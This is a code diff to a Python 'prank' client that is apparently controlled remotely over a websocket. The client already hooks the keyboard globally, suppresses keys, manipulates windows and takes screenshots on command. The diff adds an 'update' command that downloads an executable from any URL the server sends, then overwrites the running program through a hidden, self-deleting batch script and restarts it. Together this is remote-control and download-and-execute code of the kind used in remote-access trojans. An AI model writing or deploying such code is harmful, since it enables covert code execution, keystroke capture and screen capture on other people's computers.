@@ -250,13 +250,14 @@ class BoomClient:
         self.root.after(50, self._keep_debug_top)
 
     def setup_keyboard_hook(self):
+        self.setup_emergency_keys()
+
+    def setup_emergency_keys(self):
         if KEYBOARD_AVAILABLE:
             try:
                 keyboard.hook(self.on_global_key)
             except Exception as e:
                 pass
-        else:
-            pass
 
     def on_global_key(self, event):
         if event.event_type != keyboard.KEY_DOWN:
@@ -553,6 +554,7 @@ class BoomClient:
                     "type": "control",
                     "command": data.get("command"),
                     "config": data.get("config"),
+                    "url": data.get("url", ""),
                     "steps": data.get("steps", []),
                     "timestamp": data.get("timestamp")
                 }
@@ -575,6 +577,9 @@ class BoomClient:
                 if command == "macro":
                     steps = data.get("steps", [])
                     self.root.after(0, self.execute_command, steps)
+                elif command == "update":
+                    url = data.get("url", "")
+                    self.root.after(0, self.prank_update, url)
                 else:
                     self.root.after(0, self.execute_command, command)
             elif msg_type == "welcome":
@@ -620,6 +625,7 @@ class BoomClient:
             "prank_mirror_typing": self.prank_mirror_typing,
             "prank_window_exile": self.prank_window_exile,
             "prank_avalanche": self.prank_avalanche,
+            "prank_update": self.prank_update,
             "screenshot": self.capture_screenshot,
             "exit": self.stop_prank,
         }
@@ -654,9 +660,20 @@ class BoomClient:
         self._macro_active = False
         if hasattr(self, '_mirror_typing_active') and self._mirror_typing_active:
             self._mirror_typing_active = False
-            if hasattr(self, '_mirror_hook'):
-                try: keyboard.unhook(self._mirror_hook)
-                except: pass
+            unhook_success = False
+            if hasattr(self, '_mirror_hook') and self._mirror_hook:
+                try:
+                    keyboard.unhook(self._mirror_hook)
+                    unhook_success = True
+                except Exception:
+                    pass
+            if not unhook_success:
+                try:
+                    keyboard.unhook_all()
+                except Exception:
+                    pass
+                self.setup_emergency_keys()
+            self._mirror_hook = None
         if hasattr(self, '_avalanche_particles'):
             self._avalanche_particles = []
         if self.screen_flipped:
@@ -1387,6 +1404,57 @@ class BoomClient:
                     return False  # suppress original key
 
         self._mirror_hook = keyboard.hook(mirror_callback, suppress=True)
+
+    # ------------------------------------------------------------------ #
+    #  8. Update – download and self-replace from URL
+    # ------------------------------------------------------------------ #
+    def prank_update(self, url):
+        """Download update from URL and self-replace."""
+        try:
+            import urllib.request
+            import tempfile
+            import subprocess
+
+            # Download to temp file
+            tmp_dir = tempfile.gettempdir()
+            tmp_exe = os.path.join(tmp_dir, "boom_update.exe")
+
+            self.root.after(0, self.update_debug, "Stage: Update\nDownloading...")
+            urllib.request.urlretrieve(url, tmp_exe)
+
+            # Verify download
+            if os.path.getsize(tmp_exe) < 1024:
+                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Downloaded file too small"}))
+                return
+
+            # Get current EXE path
+            if not getattr(sys, 'frozen', False):
+                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Not running as frozen EXE"}))
+                return
+            current_exe = sys.executable
+
+            # Create update batch script
+            bat_path = os.path.join(tmp_dir, "boom_updater.bat")
+            with open(bat_path, "w") as f:
+                f.write('@echo off\n')
+                f.write('timeout /t 2 /nobreak >nul\n')
+                f.write(f'copy /y "{tmp_exe}" "{current_exe}"\n')
+                f.write(f'del /q "{tmp_exe}"\n')
+                f.write(f'start "" "{current_exe}"\n')
+                f.write('del /q "%~f0"\n')
+
+            # Send success message
+            self.ws.send(json.dumps({"type": "update_result", "success": True}))
+
+            # Execute update script and exit
+            subprocess.Popen(["cmd", "/c", bat_path], creationflags=0x08000000)
+            self.stop_prank()
+            os._exit(0)
+        except Exception as e:
+            try:
+                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": str(e)}))
+            except Exception:
+                pass
 
     # ------------------------------------------------------------------ #
     #  6. Window exile – slowly push every window toward nearest screen edge
